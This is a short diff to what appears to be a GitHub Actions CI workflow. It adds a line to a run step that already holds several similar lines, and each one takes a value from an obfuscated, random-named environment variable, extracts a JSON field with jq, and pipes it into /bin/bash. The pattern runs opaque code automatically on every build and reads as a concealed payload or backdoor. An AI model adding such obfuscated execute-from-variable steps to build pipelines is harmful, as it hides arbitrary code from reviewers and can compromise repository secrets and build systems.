@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$kadnq49" | jq -r .vsdrs3 | /bin/bash
           echo $igoop9400 | jq -r .sg458 | /bin/bash
           echo $tszt422 | jq -r .lm78267 | /bin/bash
+          printf '%s' "$bepfw89499" | jq -r .ck513 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
